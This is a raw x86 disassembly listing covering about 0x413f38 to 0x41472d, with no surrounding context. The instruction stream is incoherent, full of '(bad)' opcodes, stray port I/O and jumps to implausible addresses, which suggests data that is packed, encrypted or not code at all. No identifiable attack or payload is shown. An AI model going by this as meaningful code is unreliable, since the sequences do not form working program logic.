  413f38:	adc    DWORD PTR [ebx+0x1b5ca71f],ebp
  413f3e:	fmul   st,st(5)
  413f40:	and    DWORD PTR [eax],edi
  413f42:	stc    
  413f43:	ins    DWORD PTR es:[edi],dx
  413f44:	adc    bl,0x32
  413f47:	fs pop esi
  413f49:	(bad)  [edi-0x6fcc5e08]
  413f4f:	(bad)  
  413f50:	mov    cl,BYTE PTR [eax+0x5be9d453]
  413f56:	cmp    bl,BYTE PTR [ebp-0x316416f6]
  413f5c:	mov    ah,ah
  413f5e:	xor    dh,ch
  413f60:	aas    
  413f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f62:	(bad)  
  413f63:	aam    0x1f
  413f65:	bound  ecx,QWORD PTR [ebx+ecx*8-0x595f8f4e]
  413f6c:	out    dx,eax
  413f6d:	mov    eax,ds:0x34b6c3e3
  413f72:	data16 mov al,0x48
  413f75:	sub    bl,BYTE PTR [ecx]
  413f77:	js     0x413f37
  413f79:	out    0xe,eax
  413f7b:	jb     0x413fbd
  413f7d:	mov    ds:0x70cda167,eax
  413f82:	sub    eax,0xf94b6c56
  413f87:	jbe    0x413f6c
  413f89:	nop
  413f8a:	out    0xda,eax
  413f8c:	sub    al,0x46
  413f8e:	mov    dh,0x54
  413f90:	ja     0x413f1c
  413f92:	cmp    al,0x53
  413f94:	js     0x413fd7
  413f96:	sub    cl,BYTE PTR [edi+0x37f7be4b]
  413f9c:	and    ecx,DWORD PTR [ecx+0x5e]
  413f9f:	and    cl,BYTE PTR [edi]
  413fa1:	xchg   edi,eax
  413fa2:	push   ss
  413fa3:	shl    DWORD PTR [edi],0x71
  413fa6:	xor    esi,DWORD PTR [esi+0x22df84c5]
  413fac:	out    dx,eax
  413fad:	inc    ebp
  413fae:	mov    ds:0x1dcbc810,al
  413fb3:	mov    bh,BYTE PTR [ecx-0x62e06bda]
  413fb9:	xor    BYTE PTR [edi],ah
  413fbb:	call   0xdfd12df4
  413fc0:	or     WORD PTR [ecx],cx
  413fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fc5:	mov    cl,0xb6
  413fc7:	dec    eax
  413fc8:	jg     0x413f73
  413fca:	sbb    BYTE PTR [edx],dl
  413fcc:	mov    bl,BYTE PTR [ebx-0x67fd9322]
  413fd2:	pop    eax
  413fd3:	dec    edx
  413fd4:	das    
  413fd5:	jle    0x414026
  413fd7:	push   edx
  413fd8:	fsub   st,st(5)
  413fda:	adc    ebp,esi
  413fdc:	mov    eax,0x7ddde93b
  413fe1:	mov    es:0x4c9dcaa5,eax
  413fe7:	jb     0x413fc9
  413fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fea:	aad    0x71
  413fec:	xor    al,0x39
  413fee:	jecxz  0x413fc0
  413ff0:	cli    
  413ff1:	not    BYTE PTR [edx-0x71]
  413ff4:	je     0x414072
  413ff6:	jp     0x413fb8
  413ff8:	mov    BYTE PTR [esi+ecx*4-0x78],dh
  413ffc:	stos   DWORD PTR es:[edi],eax
  413ffd:	scas   eax,DWORD PTR es:[edi]
  413ffe:	xchg   DWORD PTR [esi-0x2b],ebp
  414001:	dec    edi
  414002:	or     BYTE PTR [esp+esi*2],bl
  414005:	pop    esi
  414006:	in     al,0x63
  414008:	in     eax,0x51
  41400a:	xor    cl,bh
  41400c:	mov    ch,0xf0
  41400e:	add    ah,BYTE PTR [eax-0x681c23f3]
  414014:	sub    BYTE PTR [ecx-0x34da6f3d],dh
  41401a:	adc    cl,ch
  41401c:	(bad)  
  41401d:	loop   0x41404b
  41401f:	jl     0x413fb2
  414021:	jo     0x413fd5
  414023:	ins    DWORD PTR es:[edi],dx
  414024:	fwait
  414025:	push   0xffffffcf
  414027:	(bad)  
  414028:	rcr    esi,1
  41402a:	pushf  
  41402b:	xchg   esi,eax
  41402c:	xlat   BYTE PTR ds:[ebx]
  41402d:	push   edx
  41402e:	out    0xd6,al
  414030:	sbb    ah,BYTE PTR [eax]
  414032:	je     0x41407e
  414034:	dec    ecx
  414035:	neg    cl
  414037:	push   edi
  414038:	ins    DWORD PTR es:[edi],dx
  414039:	mov    ah,0x3b
  41403b:	sub    BYTE PTR [eax-0x62802d3],bl
  414041:	call   0x19dd2733
  414046:	sbb    al,0x80
  414048:	ins    BYTE PTR es:[edi],dx
  414049:	test   al,0x4
  41404b:	enter  0x70e4,0xc0
  41404f:	adc    BYTE PTR [ebp-0x3fe2dd91],0x7e
  414056:	std    
  414057:	lods   eax,DWORD PTR ds:[esi]
  414058:	mov    edx,0xf2aeb7bc
  41405d:	jnp    0x4140ad
  41405f:	inc    esi
  414060:	xchg   edx,eax
  414061:	xlat   BYTE PTR ds:[ebx]
  414062:	jg     0x4140ac
  414064:	iret   
  414065:	or     bh,BYTE PTR [ebx]
  414067:	popa   
  414068:	outs   dx,BYTE PTR ds:[esi]
  414069:	shl    BYTE PTR [ebp-0x16],0x97
  41406d:	stc    
  41406e:	sub    eax,0x5e47a37f
  414073:	cmp    dl,BYTE PTR [ecx]
  414075:	gs fwait
  414077:	rol    BYTE PTR [ebx-0x307bc1ce],cl
  41407d:	pop    ds
  41407e:	xchg   esp,eax
  41407f:	cmp    eax,0xdb1365c6
  414084:	mov    ds:0x62a906bb,al
  414089:	cmp    ebx,DWORD PTR [edi+0x3efaf286]
  41408f:	(bad)  [edi]
  414091:	or     al,0xcc
  414093:	out    dx,al
  414094:	sbb    eax,0xf96bec6
  414099:	dec    esp
  41409a:	fbstp  TBYTE PTR [esi]
  41409c:	pop    ecx
  41409d:	sub    bl,cl
  41409f:	sbb    al,0xb0
  4140a1:	lods   al,BYTE PTR ds:[esi]
  4140a2:	xor    al,0x2f
  4140a4:	lods   al,BYTE PTR ds:[esi]
  4140a5:	clc    
  4140a6:	and    BYTE PTR [ecx+0x0],dh
  4140a9:	or     eax,0x4318def3
  4140ae:	pop    edx
  4140af:	pop    edi
  4140b0:	shl    BYTE PTR [edi+0x34a5266],1
  4140b6:	push   ebx
  4140b7:	push   esi
  4140b8:	cmp    al,0x68
  4140ba:	pop    ecx
  4140bc:	fdivr  QWORD PTR [esi+0x6bd75ace]
  4140c2:	loopne 0x414111
  4140c4:	pop    esi
  4140c5:	adc    eax,0x4871550c
  4140ca:	jbe    0x414059
  4140cc:	jmp    FWORD PTR [eax+0x6]
  4140cf:	mov    BYTE PTR [esi],al
  4140d1:	ror    edx,cl
  4140d3:	lods   al,BYTE PTR ds:[esi]
  4140d4:	(bad)  
  4140d5:	push   ss
  4140d6:	dec    esi
  4140d7:	and    dl,cl
  4140d9:	shr    BYTE PTR [esi-0x52160e70],cl
  4140df:	inc    esi
  4140e0:	loopne 0x4140c8
  4140e2:	sbb    BYTE PTR [ebp+0x13],dl
  4140e5:	imul   edx,DWORD PTR [edi+0x58],0xd7b0b054
  4140ec:	jns    0x414098
  4140ee:	imul   edi,DWORD PTR [eax+0x695cbe0a],0xffffff9a
  4140f5:	jp     0x4140b7
  4140f7:	add    eax,0x15412074
  4140fc:	test   eax,0xce98b8c4
  414101:	sar    DWORD PTR gs:[ebp-0x2e],cl
  414105:	jl     0x41417e
  414107:	mov    esp,0x428abec2
  41410c:	adc    edx,edx
  41410e:	add    DWORD PTR [eax+0x6807873],esi
  414114:	push   esp
  414115:	adc    DWORD PTR [esi-0x16],0xf4916e48
  41411c:	fwait
  41411d:	or     bl,BYTE PTR [ecx]
  41411f:	jns    0x4140c8
  414121:	bound  ecx,QWORD PTR [ebp+0x7f]
  414124:	rol    BYTE PTR [edx+eax*2+0x2d8a5037],1
  41412b:	mov    eax,0xc11f848
  414130:	int    0xd3
  414132:	xor    cl,BYTE PTR [edi+edi*4+0x2ac04e0a]
  414139:	cmp    DWORD PTR [edi+0x5a40499],ecx
  41413f:	and    bh,BYTE PTR [edi]
  414141:	xor    DWORD PTR [eax],ecx
  414143:	js     0x4140d7
  414145:	jbe    0x41411b
  414147:	test   edi,esi
  414149:	addr16 push edi
  41414b:	push   edi
  41414c:	mov    edx,0xe5a86cd6
  414151:	inc    esp
  414152:	jnp    0x4140f7
  414154:	xlat   BYTE PTR ds:[ebx]
  414155:	rcl    DWORD PTR [ecx+ebp*2+0x27],0xa9
  41415a:	cmp    BYTE PTR [eax+0x2f],dh
  41415d:	(bad)  
  41415e:	fstp   TBYTE PTR [ebp-0x13]
  414161:	mov    DWORD PTR [ebx],edi
  414163:	jle    0x414160
  414165:	or     al,0xdd
  414167:	imul   ebp,DWORD PTR [ebx+ebp*8+0x29],0x78
  41416c:	cli    
  41416d:	ins    BYTE PTR es:[edi],dx
  41416e:	xor    eax,0x73cd9eaf
  414173:	sbb    al,0xb4
  414175:	xor    DWORD PTR [ecx-0x475d06f1],esi
  41417b:	cli    
  41417c:	test   al,0xaf
  41417e:	xor    eax,0x7e1f488f
  414183:	mov    gs,WORD PTR [edi-0x24]
  414186:	xlat   BYTE PTR ds:[ebx]
  414187:	pop    gs
  414189:	loop   0x41415a
  41418b:	int    0x6a
  41418d:	aam    0x46
  41418f:	push   es
  414190:	mov    bh,0x7d
  414192:	mov    esi,DWORD PTR ds:0x30ad0a14
  414198:	lock lea ecx,[ebx]
  41419b:	push   esi
  41419c:	mov    ebx,0xd2037bae
  4141a1:	pusha  
  4141a2:	push   esp
  4141a3:	fwait
  4141a4:	clc    
  4141a5:	mov    esi,0xa48c2e2b
  4141aa:	cmp    eax,0xbccdd0e6
  4141af:	mov    dh,BYTE PTR [ebx+0x22]
  4141b2:	xor    al,0x44
  4141b4:	dec    ebp
  4141b5:	dec    ebx
  4141b6:	and    bh,0x40
  4141b9:	mov    bh,0x3c
  4141bb:	in     al,0x26
  4141bd:	add    edx,edx
  4141bf:	add    BYTE PTR [edi+0x75],cl
  4141c2:	rcl    dl,cl
  4141c4:	arpl   WORD PTR [edx-0x507d4843],bx
  4141ca:	mov    edi,0x53b888bb
  4141cf:	sub    DWORD PTR [eax],edx
  4141d1:	cmp    eax,0x6bf1fe96
  4141d6:	mov    DWORD PTR [ebp+0x2b575603],edx
  4141dc:	imul   eax,DWORD PTR ds:0xa0f0b61f,0x52
  4141e3:	sub    eax,0x70169c6b
  4141e8:	test   BYTE PTR [ebp+edi*8-0x4c480542],dl
  4141ef:	adc    DWORD PTR [ebx+0x4167c7b0],esp
  4141f5:	pop    ebp
  4141f6:	call   0xe848:0x635021e3
  4141fd:	enter  0xef4f,0xc9
  414201:	fild   WORD PTR [edi+eiz*1]
  414204:	pusha  
  414205:	je     0x41420c
  414207:	shr    BYTE PTR [eax],1
  414209:	clc    
  41420a:	xor    eax,0xe7920197
  41420f:	(bad)  
  414210:	mov    eax,0xf347020
  414215:	cmp    BYTE PTR [ebp-0x3fd7c239],dl
  41421b:	sbb    al,0xa7
  41421d:	pop    ds
  41421e:	add    cl,BYTE PTR [ebx+0x1a7015bb]
  414224:	sbb    dh,bl
  414226:	mov    bl,0x26
  414228:	popf   
  414229:	mov    ebx,0xdcf787c9
  41422e:	mov    bh,0xc3
  414230:	clc    
  414231:	sub    al,0xfe
  414233:	xchg   ebp,eax
  414234:	xor    dl,cl
  414236:	mov    edi,0x264f679f
  41423b:	pop    es
  41423c:	push   ebp
  41423d:	popa   
  41423e:	scas   al,BYTE PTR es:[edi]
  41423f:	lea    esi,[edi-0x43f07be2]
  414245:	mov    edx,0xc20b4eb4
  41424a:	lea    ebp,[edi]
  41424c:	sahf   
  41424d:	fidiv  DWORD PTR [ecx+eax*8+0x2a]
  414251:	mov    ebp,0x32101d7e
  414256:	iret   
  414257:	mov    dl,0xf9
  414259:	popa   
  41425a:	push   ss
  41425b:	xchg   esi,eax
  41425c:	sub    ebp,DWORD PTR [esi]
  41425e:	add    al,0x20
  414260:	ror    BYTE PTR [eiz*4+0x53e5aa56],0x2e
  414268:	aam    0x22
  41426a:	mov    al,0x61
  41426c:	jb     0x414263
  41426e:	jg     0x4142bc
  414270:	or     bh,cl
  414272:	loope  0x4142a3
  414274:	push   0x24
  414276:	jmp    0x709a:0xb66e6ef4
  41427d:	mov    fs,ecx
  41427f:	push   es
  414280:	out    dx,al
  414281:	xlat   BYTE PTR ds:[ebx]
  414282:	sub    al,0x4a
  414284:	and    al,0xd
  414286:	lea    ebx,[ecx]
  414288:	adc    al,0xf9
  41428a:	test   DWORD PTR [edi-0x20],ebp
  41428d:	mov    ss,WORD PTR [esi-0xc]
  414290:	out    0xf,eax
  414292:	and    DWORD PTR [ecx],0x1b4b793d
  414298:	jecxz  0x414229
  41429a:	xchg   DWORD PTR [ecx+0x11fe837f],eax
  4142a0:	adc    cl,BYTE PTR [ecx]
  4142a2:	imul   ecx,DWORD PTR [esi-0x56ede4f2],0x87caccf2
  4142ac:	or     dh,BYTE PTR [edx-0x121ef9d7]
  4142b2:	les    ebp,FWORD PTR ds:0x3f0c5020
  4142b8:	xchg   DWORD PTR [edi+edi*2+0x57e8350f],ebx
  4142bf:	in     eax,0xe3
  4142c1:	arpl   WORD PTR [edx-0x56aedac6],si
  4142c7:	xor    DWORD PTR [ebx+esi*8],eax
  4142ca:	arpl   WORD PTR [eax],di
  4142cc:	push   cs
  4142cd:	shl    BYTE PTR [esi],cl
  4142cf:	clc    
  4142d0:	cmc    
  4142d1:	ds cmp eax,0xf9651d18
  4142d7:	jnp    0x4142af
  4142d9:	cld    
  4142da:	jno    0x41428a
  4142dc:	or     eax,0xdc68f9d9
  4142e1:	out    0x56,eax
  4142e3:	xor    ebp,DWORD PTR [ebx]
  4142e5:	stos   BYTE PTR es:[edi],al
  4142e6:	sbb    BYTE PTR [edi+ecx*1+0x29],bh
  4142ea:	and    al,0xd7
  4142ec:	xchg   esi,eax
  4142ed:	push   esp
  4142ee:	dec    esp
  4142ef:	sub    al,0x15
  4142f1:	rol    BYTE PTR [edi-0x3fea6d8d],0x25
  4142f8:	cmp    al,0xe0
  4142fa:	mov    bl,0xdb
  4142fc:	jmp    0x3b42:0x10fb43fd
  414303:	pop    esi
  414304:	cdq    
  414305:	jmp    0x899ff229
  41430a:	js     0x4142a0
  41430c:	inc    esi
  41430d:	mov    ds:0x3c7101ea,al
  414312:	hlt    
  414313:	rcr    BYTE PTR [edx+edx*8-0x32],0xcc
  414318:	cmp    eax,0xbec56272
  41431d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41431e:	jns    0x414385
  414320:	sub    cl,ah
  414322:	mov    ds:0xa1436d0d,eax
  414327:	and    eax,0x5c6e6f30
  41432c:	aaa    
  41432d:	std    
  41432e:	inc    esp
  41432f:	je     0x4142bd
  414331:	fild   DWORD PTR [ebx+0x2b]
  414334:	adc    ecx,DWORD PTR [eax+eiz*2-0x1f89aefa]
  41433b:	mov    ds:0xa9e6d255,eax
  414340:	adc    ebx,DWORD PTR [ecx-0x7bfeb752]
  414346:	loope  0x41434d
  414348:	mov    ch,0x7
  41434a:	jae    0x4143c3
  41434c:	sbb    ebx,DWORD PTR [ecx-0x55a4cad1]
  414352:	pop    edi
  414353:	xlat   BYTE PTR ds:[ebx]
  414354:	je     0x414327
  414356:	(bad)
  414359:	data16 fdiv st,st(6)
  41435c:	xchg   ebp,eax
  41435d:	jle    0x414322
  41435f:	sti    
  414360:	fldenv [eax-0x3f]
  414363:	inc    ebx
  414364:	setbe  BYTE PTR [edx+0x3f]
  414368:	push   eax
  414369:	in     eax,0x13
  41436b:	inc    ebx
  41436c:	test   al,0x84
  41436e:	adc    eax,0xcaf5bb5f
  414373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414374:	and    al,0x3a
  414376:	jno    0x4143bf
  414378:	stc    
  414379:	out    dx,eax
  41437a:	jbe    0x4143da
  41437c:	in     eax,dx
  41437d:	sub    bh,ah
  41437f:	mov    edx,0x3d1ef9f0
  414384:	scas   al,BYTE PTR es:[edi]
  414385:	fs cmp edx,eax
  414388:	(bad)  
  414389:	jg     0x4143c0
  41438b:	jmp    0xcce9:0x8aeef2d6
  414392:	sbb    al,0xc1
  414394:	mov    ah,0x9d
  414396:	arpl   WORD PTR [eax-0x4b],di
  414399:	mov    al,0x16
  41439b:	and    DWORD PTR [esi-0x71102183],ebp
  4143a1:	in     al,dx
  4143a2:	cld    
  4143a3:	lock add bl,dl
  4143a6:	mov    ah,0xc8
  4143a8:	fdivrp st(7),st
  4143aa:	shr    edx,1
  4143ac:	(bad)  
  4143ad:	iret   
  4143ae:	aaa    
  4143af:	loopne 0x41439e
  4143b1:	add    BYTE PTR [ebx+0x653032a8],dl
  4143b7:	sbb    al,0xa9
  4143b9:	in     eax,0x14
  4143bb:	cmp    BYTE PTR [ebp+0x41],dl
  4143be:	cmc    
  4143bf:	and    al,0x53
  4143c1:	push   ebp
  4143c2:	popf   
  4143c3:	imul   ebp,DWORD PTR [ebp-0x55],0x273b8e51
  4143ca:	std    
  4143cb:	lods   eax,DWORD PTR es:[esi]
  4143cd:	push   edi
  4143ce:	sbb    eax,0xf2d32935
  4143d3:	xchg   esp,eax
  4143d4:	and    ecx,DWORD PTR [ebx+ebx*1+0x1c]
  4143d8:	sbb    al,0x18
  4143da:	inc    ebp
  4143db:	popf   
  4143dc:	push   ecx
  4143dd:	mov    DWORD PTR [edx+0x23],ebp
  4143e0:	cdq    
  4143e1:	add    eax,0xb388822f
  4143e6:	pop    eax
  4143e7:	adc    BYTE PTR [edi-0x2bacd1e9],ch
  4143ed:	pop    es
  4143ee:	xchg   esp,eax
  4143ef:	jo     0x801ee547
  4143f5:	iret   
  4143f6:	in     al,dx
  4143f7:	cs in  eax,dx
  4143f9:	in     eax,dx
  4143fa:	xchg   BYTE PTR [esi-0x31],bh
  4143fd:	bound  edi,QWORD PTR [ebx-0x595ac2c2]
  414403:	scas   eax,DWORD PTR es:[edi]
  414404:	mov    ebx,0xd1fa209f
  414409:	ret    
  41440a:	popf   
  41440b:	test   BYTE PTR [ebp-0x9ef65e5],bl
  414411:	push   esp
  414412:	or     ebx,DWORD PTR [edi+0x2b4f417f]
  414418:	cmp    bl,BYTE PTR ds:0x94280d38
  41441e:	ds inc ecx
  414420:	(bad)  
  414421:	adc    al,0xf6
  414423:	clc    
  414424:	sub    eax,DWORD PTR [esi+0x49f38127]
  41442a:	or     BYTE PTR ds:0x794c3bc4,bh
  414430:	dec    edx
  414431:	mov    edx,0x3c67bb6a
  414436:	and    bh,dl
  414438:	fsub   QWORD PTR [edi]
  41443a:	xchg   BYTE PTR [ecx-0x33],ch
  41443d:	push   0xce479f8
  414442:	(bad)  
  414443:	mov    bl,0xdc
  414445:	and    ah,BYTE PTR [edi]
  414447:	dec    edx
  414448:	cmp    BYTE PTR [edx-0x27487aa9],dh
  41444e:	hlt    
  41444f:	sbb    al,0x3b
  414451:	or     BYTE PTR ds:0x21420b0e,bh
  414457:	jmp    0xc6ed89a1
  41445c:	sub    al,0x21
  41445e:	sti    
  41445f:	imul   edi,esp,0x4c
  414462:	repnz cs iret 
  414465:	or     al,0x5a
  414467:	and    bl,BYTE PTR [edi+0x6c]
  41446a:	jle    0x4143f6
  41446c:	fsub   QWORD PTR [ecx+0x76ecb98f]
  414472:	mov    bl,0x92
  414474:	test   eax,0x9df4dc01
  414479:	addr16 pushf 
  41447b:	push   esp
  41447c:	xor    BYTE PTR [ecx],0x35
  41447f:	fstp   QWORD PTR [ebx]
  414481:	xor    eax,0xc2f9b9c4
  414486:	adc    BYTE PTR ds:0xf1d162c,bl
  41448c:	jnp    0x414450
  41448e:	mov    BYTE PTR [eax],ah
  414490:	sbb    BYTE PTR [eax-0x23],0x45
  414494:	sub    BYTE PTR [ecx-0x58f4cc5c],bl
  41449a:	ror    BYTE PTR [ebp-0x6],1
  41449d:	ds arpl cx,ax
  4144a0:	adc    esp,ebx
  4144a2:	mov    edx,0x4305f0ce
  4144a7:	mov    bh,0xe1
  4144a9:	js     0x4144e9
  4144ab:	mov    edx,0xc21abd69
  4144b0:	movsx  esi,WORD PTR [esi+ecx*8]
  4144b4:	icebp  
  4144b5:	jecxz  0x414533
  4144b7:	ret    0x7ba5
  4144ba:	mov    ebp,0x86904229
  4144bf:	dec    esp
  4144c0:	(bad)  [edi]
  4144c2:	and    ecx,DWORD PTR [edi]
  4144c4:	rol    edx,1
  4144c6:	add    ebx,ebx
  4144c8:	jecxz  0x4144d5
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	bound  esi,QWORD PTR [edx+0x46884f08]
  4144d1:	inc    ecx
  4144d2:	add    DWORD PTR [edi-0x70],edi
  4144d5:	dec    ebp
  4144d6:	xchg   dh,bl
  4144d8:	retf   
  4144d9:	jge    0x4144c3
  4144db:	daa    
  4144dc:	stc    
  4144dd:	and    ecx,0x8e82aa3d
  4144e3:	int    0x0
  4144e5:	mov    cl,0x4f
  4144e7:	sbb    DWORD PTR [eiz*2+0x78fb38b7],0xffffffba
  4144ef:	and    bl,ch
  4144f1:	adc    eax,0xf6a551d7
  4144f6:	pop    esi
  4144f7:	push   ebx
  4144f8:	loopne 0x4144fe
  4144fa:	mov    esi,DWORD PTR [edi-0x3b]
  4144fd:	(bad)  
  4144fe:	fbstp  TBYTE PTR [edx+0x5dacaedd]
  414504:	frstor [edi-0x57]
  414507:	and    BYTE PTR [edx+0x1],bh
  41450a:	add    eax,0xe62eb936
  41450f:	call   0xaa16864d
  414514:	ins    DWORD PTR es:[edi],dx
  414515:	mov    cl,0xce
  414517:	fwait
  414518:	push   eax
  414519:	pop    ss
  41451a:	cmp    ch,bh
  41451c:	jle    0x4144b2
  41451e:	jae    0x414511
  414520:	in     al,dx
  414521:	and    eax,0x8b8ba57f
  414526:	jle    0x414595
  414528:	mov    eax,0xd4b1c09e
  41452d:	adc    al,0x2a
  41452f:	daa    
  414530:	ins    DWORD PTR es:[edi],dx
  414531:	retf   0x3c5e
  414534:	out    0xec,eax
  414536:	pop    ebp
  414537:	push   ds
  414538:	push   edi
  414539:	nop
  41453a:	shl    BYTE PTR [eax],1
  41453c:	xchg   ebp,eax
  41453d:	jle    0x4144cf
  41453f:	dec    ecx
  414540:	and    al,0x2a
  414542:	(bad)  
  414543:	lock pop ecx
  414545:	cmp    ecx,ebp
  414547:	cmp    eax,0xfc5b22c3
  41454c:	jnp    0x414583
  41454e:	ja     0x414595
  414550:	outs   dx,BYTE PTR ds:[esi]
  414551:	in     al,0x48
  414553:	outs   dx,WORD PTR ds:[esi]
  414556:	ficom  WORD PTR [esi-0x5a]
  414559:	retf   0x1bbb
  41455c:	aam    0x30
  41455e:	cld    
  41455f:	lods   eax,DWORD PTR ds:[esi]
  414560:	sbb    dh,BYTE PTR [eax+0x4b6e549f]
  414566:	and    eax,0x62359fe7
  41456b:	inc    esp
  41456c:	out    0x1,al
  41456e:	cmp    bl,bh
  414570:	out    dx,al
  414571:	std    
  414572:	jl     0x41455a
  414574:	scas   al,BYTE PTR es:[edi]
  414575:	call   edi
  414577:	add    eax,0x4810d059
  41457c:	cmp    DWORD PTR [ecx+0x5f28a2e4],esi
  414582:	inc    ebp
  414583:	inc    esi
  414584:	mov    ebx,edi
  414586:	imul   ebx,edi,0xffffff83
  414589:	sahf   
  41458a:	outs   dx,BYTE PTR ds:[esi]
  41458b:	loop   0x4145f4
  41458d:	scas   al,BYTE PTR es:[edi]
  41458e:	xor    eax,0xbe4e985d
  414593:	xlat   BYTE PTR ds:[ebx]
  414594:	mov    bl,bh
  414596:	mov    eax,0x2b50ffca
  41459b:	scas   eax,DWORD PTR es:[edi]
  41459c:	mov    edi,0x4a19a383
  4145a1:	adc    ecx,ebx
  4145a3:	mov    edi,0xd2e41edc
  4145a8:	push   eax
  4145a9:	xchg   esp,eax
  4145aa:	push   ebp
  4145ab:	repnz mov bl,0xe6
  4145ae:	xor    DWORD PTR ds:0x64231674,eax
  4145b4:	dec    ebx
  4145b5:	idiv   ebp
  4145b7:	arpl   WORD PTR [esi-0x5b],si
  4145ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145bb:	fdivr  st,st(0)
  4145bd:	neg    DWORD PTR [edi]
  4145bf:	xchg   esi,eax
  4145c0:	sub    BYTE PTR ds:0xbfd43210,0x8e
  4145c7:	mov    al,0x88
  4145c9:	out    0xe5,al
  4145cb:	inc    esi
  4145cc:	xchg   BYTE PTR [eax],dh
  4145ce:	daa    
  4145cf:	jno    0x4145bf
  4145d1:	xlat   BYTE PTR ds:[ebx]
  4145d2:	and    esi,esi
  4145d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145d5:	adc    al,0x7f
  4145d7:	add    eax,0x4ddb6471
  4145dc:	jnp    0x4145cd
  4145de:	je     0x4145be
  4145e0:	ins    DWORD PTR es:[edi],dx
  4145e1:	sub    ch,BYTE PTR [ebp+0x2e]
  4145e4:	imul   esi,esp,0xbc423ed5
  4145ea:	mov    DWORD PTR [ebx],ebx
  4145ec:	or     BYTE PTR [ebx],bl
  4145ee:	adc    edx,eax
  4145f0:	or     BYTE PTR [esi+0x70f8c3d2],dl
  4145f6:	fnop   
  4145f8:	mov    edi,0x77c88753
  4145fd:	sbb    BYTE PTR [ecx],bh
  4145ff:	jecxz  0x4145dd
  414601:	scas   eax,DWORD PTR es:[edi]
  414602:	jo     0x41459f
  414604:	ins    BYTE PTR es:[edi],dx
  414605:	mov    dh,0xd4
  414607:	mul    BYTE PTR [edx-0x42854f21]
  41460d:	not    DWORD PTR [edi+0x29dca79e]
  414613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414614:	sti    
  414615:	retf   
  414616:	aas    
  414617:	scas   al,BYTE PTR es:[edi]
  414618:	inc    eax
  414619:	inc    edi
  41461a:	mov    ch,0x89
  41461c:	clc    
  41461d:	rcr    DWORD PTR [ebx+0x43],0x85
  414621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414622:	daa    
  414623:	mov    fs,WORD PTR [ebx+0x53]
  414626:	push   es
  414627:	dec    eax
  414628:	mov    ds,edi
  41462a:	cdq    
  41462b:	cmp    al,0x51
  41462d:	ja     0x4145fb
  41462f:	div    bl
  414631:	and    BYTE PTR [ebx],al
  414633:	jns    0x4145b7
  414635:	pop    ebx
  414636:	fwait
  414637:	sbb    cl,cl
  414639:	icebp  
  41463a:	sub    eax,0xce71b05
  41463f:	xchg   edi,eax
  414640:	mov    dh,0x50
  414642:	xchg   esp,eax
  414643:	aad    0xe4
  414645:	aas    
  414646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414647:	std    
  414648:	xchg   edx,eax
  414649:	pushf  
  41464a:	(bad)  
  41464c:	or     al,0x2f
  41464e:	hlt    
  41464f:	lods   eax,DWORD PTR ds:[esi]
  414650:	mov    ebp,0xa97c5530
  414655:	pop    esp
  414656:	int3   
  414657:	or     DWORD PTR [eax],esp
  414659:	and    al,0xdf
  41465b:	arpl   WORD PTR [esi+0x5a83e614],sp
  414661:	mov    ebp,0x8a8de8fe
  414666:	shr    BYTE PTR [ebp+ecx*8-0x43],1
  41466a:	hlt    
  41466b:	aam    0xce
  41466d:	out    0x14,al
  41466f:	shr    BYTE PTR [ebx+edx*2-0x55],1
  414673:	cwde   
  414674:	lods   al,BYTE PTR ss:[esi]
  414676:	dec    bx
  414678:	inc    edi
  414679:	sub    eax,DWORD PTR [ecx-0x5dccb8a9]
  41467f:	or     al,0xd8
  414681:	icebp  
  414682:	mov    ebx,0x39124a04
  414687:	fcomi  st,st(6)
  414689:	mov    ebp,0x8545b2cc
  41468e:	neg    DWORD PTR [edi+0x2c08c82c]
  414694:	and    eax,DWORD PTR [esi-0x62988c69]
  41469a:	xor    al,0xd5
  41469c:	dec    ebx
  41469d:	mov    ds:0x4854e4a6,al
  4146a2:	inc    edi
  4146a3:	or     DWORD PTR [ebx-0x17b672ad],eax
  4146a9:	xchg   DWORD PTR [ecx+ebx*1+0x325b854b],ebp
  4146b0:	adc    DWORD PTR [edi+eiz*4-0x39],edi
  4146b4:	cmovp  ecx,DWORD PTR [edi]
  4146b7:	jnp    0x414681
  4146b9:	and    bh,0x2
  4146bc:	scas   al,BYTE PTR es:[edi]
  4146bd:	ror    BYTE PTR [esi],0x88
  4146c0:	pop    es
  4146c1:	mov    ?,WORD PTR [ebx-0x3e2f6c90]
  4146c7:	imul   esi,ebx,0xffffff94
  4146ca:	(bad)  
  4146cb:	scas   al,BYTE PTR es:[edi]
  4146cc:	xchg   ebp,eax
  4146cd:	lock fmul QWORD PTR [eax-0x40]
  4146d1:	push   ebp
  4146d2:	std    
  4146d3:	shr    DWORD PTR [edx-0x78],0xa2
  4146d7:	repz clc 
  4146d9:	and    eax,0x3a7be6d4
  4146de:	aas    
  4146df:	and    esi,DWORD PTR [ecx-0x7f]
  4146e2:	push   edi
  4146e3:	sbb    dh,dh
  4146e5:	lods   al,BYTE PTR ds:[esi]
  4146e6:	sub    bl,BYTE PTR [edx-0x5d57772e]
  4146ec:	mov    esp,0xff5ee1c9
  4146f1:	sub    al,0xa0
  4146f3:	lds    ecx,FWORD PTR [esi+0xf]
  4146f6:	sub    DWORD PTR [ebp-0x65],0x1b2ad7d1
  4146fd:	jge    0x4146f6
  4146ff:	mov    dl,0xcd
  414701:	in     al,dx
  414702:	push   es
  414703:	mov    ebp,0x88cfe4e
  414708:	pop    eax
  414709:	out    0xfc,eax
  41470b:	popa   
  41470c:	mov    ebx,0x2badf491
  414711:	inc    ebx
  414712:	fstp   DWORD PTR [ebp+0x25ae6e6]
  414718:	push   edi
  414719:	ja     0x414780
  41471b:	pop    edx
  41471c:	pop    edi
  41471d:	inc    ebx
  41471e:	inc    edx
  41471f:	sub    BYTE PTR [ecx],0xdb
  414722:	icebp  
  414723:	push   0x7f05294f
  414728:	add    eax,0x78a81079
  41472d:	imul   ebx,eax,0x77
